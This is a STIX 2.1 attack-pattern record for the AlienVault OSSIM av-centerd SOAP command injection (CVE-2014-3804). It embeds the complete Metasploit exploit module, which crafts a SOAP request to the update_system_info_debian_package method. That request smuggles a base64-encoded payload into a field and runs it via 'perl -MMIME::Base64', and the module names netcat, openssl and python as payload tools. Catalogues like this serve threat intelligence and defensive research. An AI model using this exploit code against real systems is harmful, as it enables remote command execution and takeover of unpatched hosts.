{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ea2176f-c4a3-4ac9-9c05-e4e68c89dee0",
    "created": "2024-08-14T16:59:52.548907Z",
    "modified": "2024-08-14T16:59:52.548911Z",
    "name": "AlienVault OSSIM av-centerd Command Injection",
    "description": " This module exploits a code execution flaw in AlienVault 4.6.1 and prior.  The vulnerability exists in the av-centerd SOAP web service where the update_system_info_debian_package method uses perl backticks in an insecure way, allowing command injection. This module has been tested successfully on AlienVault 4.6.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ids/alienvault_centerd_soap_exec.rb",
            "external_id": "alienvault_centerd_soap_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3804"
        },
        {
            "source_name": "reference",
            "url": "http://forums.alienvault.com/discussion/2690"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'AlienVault OSSIM av-centerd Command Injection',\n      'Description'   => %q{\n        This module exploits a code execution flaw in AlienVault 4.6.1 and\n        prior.  The vulnerability exists in the av-centerd SOAP web service,\n        where the update_system_info_debian_package method uses perl backticks\n        in an insecure way, allowing command injection. This module has been\n        tested successfully on AlienVault 4.6.0.\n      },\n      'Author'        =>\n        [\n          'Unknown', # From HP ZDI team, Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          ['CVE', '2014-3804'],\n          ['BID', '67999'],\n          ['ZDI', '14-202'],\n          ['URL', 'http://forums.alienvault.com/discussion/2690']\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          #'BadChars'   => \"[;`$<>|]\", # Don't apply bcuz of the perl stub applied\n          'Compat'      => {\n            'RequiredCmd' => 'perl netcat-e openssl python gawk'\n          }\n        },\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'Targets'        =>\n        [\n          [ 'AlienVault <= 4.6.1', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-05-05'))\n\n    register_options(\n      [\n        Opt::RPORT(40007)\n      ])\n  end\n\n  def check\n    version = \"\"\n    res = send_soap_request(\"get_dpkg\")\n\n    if res &&\n       res.code == 200 &&\n       res.headers['SOAPServer'] &&\n       res.headers['SOAPServer'] =~ /SOAP::Lite/ &&\n       res.body.to_s =~ /alienvault-center\\s*([\\d\\.]*)-\\d/\n\n      version = $1\n    end\n\n    if version.empty? || version >= \"4.7.0\"\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Appears\n    end\n  end\n\n  def exploit\n    send_soap_request(\"update_system_info_debian_package\", 1)\n  end\n\n  def build_soap_request(method)\n    xml = Document.new\n    xml.add_element(\n      \"soap:Envelope\",\n      {\n        'xmlns:xsi'          => \"http://www.w3.org/2001/XMLSchema-instance\",\n        'xmlns:soapenc'      => \"http://schemas.xmlsoap.org/soap/encoding/\",\n        'xmlns:xsd'          => \"http://www.w3.org/2001/XMLSchema\",\n        'soap:encodingStyle' => \"http://schemas.xmlsoap.org/soap/encoding/\",\n        'xmlns:soap'         => \"http://schemas.xmlsoap.org/soap/envelope/\"\n      })\n    body = xml.root.add_element(\"soap:Body\")\n    m = body.add_element(\n      method,\n      {\n        'xmlns' => \"AV/CC/Util\"\n      })\n    args = []\n    args[0] = m.add_element(\"c-gensym3\", {'xsi:type' => 'xsd:string'})\n    args[1] = m.add_element(\"c-gensym5\", {'xsi:type' => 'xsd:string'})\n    args[2] = m.add_element(\"c-gensym7\", {'xsi:type' => 'xsd:string'})\n    args[3] = m.add_element(\"c-gensym9\", {'xsi:type' => 'xsd:string'})\n    (0..3).each { |i| args[i].text = rand_text_alpha(4 + rand(4)) }\n\n    if method == \"update_system_info_debian_package\"\n      args[4] = m.add_element(\"c-gensym11\", {'xsi:type' => 'xsd:string'})\n      perl_payload  = \"system(decode_base64\"\n      perl_payload += \"(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\"))\"\n      args[4].text  = \"#{rand_text_alpha(4 + rand(4))}\"\n      args[4].text += \" && perl -MMIME::Base64 -e '#{perl_payload}'\"\n    end\n\n    xml.to_s\n  end\n\n  def send_soap_request(method, timeout = 20)\n    soap = build_soap_request(method)\n\n    res = send_request_cgi({\n      'uri'      => '/av-centerd',\n      'method'   => 'POST',\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => soap,\n      'headers'  => {\n        'SOAPAction' => \"\\\"AV/CC/Util##{method}\\\"\"\n      }\n    }, timeout)\n\n    res\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-05-05",
    "x_mitre_platforms": [
        "unix'"
    ]
}